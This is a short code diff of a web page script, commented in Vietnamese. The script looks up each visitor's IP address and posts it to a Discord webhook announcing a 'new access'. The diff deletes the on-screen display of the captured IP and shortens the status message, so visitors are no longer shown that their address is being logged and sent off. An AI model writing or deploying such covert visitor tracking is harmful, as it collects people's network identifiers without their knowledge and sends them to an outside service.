@@ -24,9 +24,6 @@
             const data = await response.json();
             const userIP = data.ip;
 
-            // Hiển thị lên màn hình
-            document.getElementById('ip-display').innerText = "> Detected IP: " + userIP;
-
             // 2. Gửi dữ liệu về Discord Webhook
             const payload = {
                 content: "🚀 **Phát hiện truy cập mới!**",
@@ -47,7 +44,7 @@
                 body: JSON.stringify(payload)
             });
 
-            document.getElementById('status').innerText = "> Log sent successfully.";
+            document.getElementById('status').innerText = "> Log successfully.";
 
         } catch (error) {
             console.error("Lỗi:", error);
